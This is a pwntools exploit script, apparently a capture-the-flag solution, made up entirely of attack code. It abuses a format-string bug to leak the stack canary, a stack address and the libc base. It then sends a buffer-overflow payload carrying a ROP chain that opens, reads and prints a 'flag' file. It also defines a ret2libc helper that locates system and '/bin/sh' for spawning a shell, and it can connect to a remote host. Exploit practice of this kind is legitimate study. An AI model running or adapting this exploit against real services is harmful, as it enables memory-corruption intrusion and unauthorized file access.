from pwn import *
import sys
from LibcSearcher import *
context.log_level='debug'
context.arch='amd64'

def ret2libc(leak,func,path=''):
    if path == '':
        libc = LibcSearcher(func,leak)
        base = leak - libc.dump(func)
        system = base + libc.dump('system')
        binsh = base + libc.dump('str_bin_sh')
    else:
        libc = path
        libc.address = leak - libc.sym[func]
        system = libc.sym['system']
        binsh = next(libc.search(b'/bin/sh'))
    return (system,binsh)

s = lambda data : io.send(data)
sa = lambda str1,data : io.sendafter(str1,data)
sl = lambda data : io.sendline(data)
sla = lambda str1,data : io.sendlineafter(str1,data)
r = lambda num : io.recv(num)
rl = lambda keepends=True : io.recvline(keepends)
ru = lambda data,drop=True : io.recvuntil(data,drop)
ia = lambda : io.interactive()
uu32 = lambda data : u32(data.ljust(4,b'\x00'))
uu64 = lambda data : u64(data.ljust(8,b'\x00'))
i16 = lambda data : int(data,16)
leak = lambda name,addr : log.success('{} = {:#x}'.format(name, addr))
dbg = lambda : gdb.attach(io)

if len(sys.argv) == 3:
    io = remote(sys.argv[1], sys.argv[2])
elif len(sys.argv) == 2:
    if ':' in sys.argv[1]:
        rmt = sys.argv[1].split(':')
        io = remote(rmt[0], rmt[1])
    else:
        io = process(sys.argv[1])
        elf = ELF(sys.argv[1])
else:
    io = process('./pwn')

elf = ELF("./pwn")

offset = 6
sa("?","%27$p,%28$p,%39$p")
ru("0x")
canary = i16(ru("00",False))
leak("canary",canary)
ru("0x")
stack = i16(r(12))
leak("stack",stack)
ru("0x")
libc_start_main = i16(r(12)) - 240
leak("libc_start_main",libc_start_main)

# libc = LibcSearcher("read",read_addr)
libc = ELF("/home/bi0x/ctftools/pwntools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so")
libc.address = libc_start_main - libc.sym["__libc_start_main"]
open_addr = libc.sym["open"]
puts_addr = libc.sym["puts"]
read_addr = libc.sym["read"]
# base = read_addr - libc.dump("read")
# open_addr = base + libc.dump("open")
# puts_addr = base + libc.dump("puts")
# read_addr = base + libc.dump("read")
# dbg()

syscall = next(libc.search(asm("syscall")))
pop_rdi = next(libc.search(asm("pop rdi; ret")))
pop_rsi = next(libc.search(asm("pop rsi; ret")))
pop_rax_ret = next(libc.search(asm("pop rax; ret")))
pop_rdx_ret = next(libc.search(asm("pop rdx; ret")))
pop_rdx__rbx_ret = next(libc.search(asm("pop rdx; pop rbx; ret")))


flag_addr = stack + 0xb8

orw = flat([
    pop_rdi, flag_addr, pop_rsi, 0, open_addr,
    pop_rdi, 3, pop_rsi, flag_addr, pop_rdx__rbx_ret, 0x100, 0, read_addr,
    pop_rdi, flag_addr, puts_addr
]).ljust(0x100,b"B") + b"flag\x00"
# dbg()

payload = b"b"*(0x70-0x8) + p64(canary) + b"bi0xbi0x" + orw

sla("?",payload)  

ia()